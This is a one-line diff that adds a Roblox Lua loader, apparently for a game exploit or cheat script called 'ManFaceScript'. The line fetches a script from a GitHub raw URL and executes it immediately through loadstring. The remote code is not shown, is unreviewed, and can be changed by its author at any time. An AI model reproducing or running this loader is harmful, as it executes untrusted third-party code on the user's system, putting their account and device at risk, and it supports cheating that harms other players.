@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ManFaceScript/ManFaceScript/refs/heads/main/GEF%20-%20ManFaceScript%20V1"))()
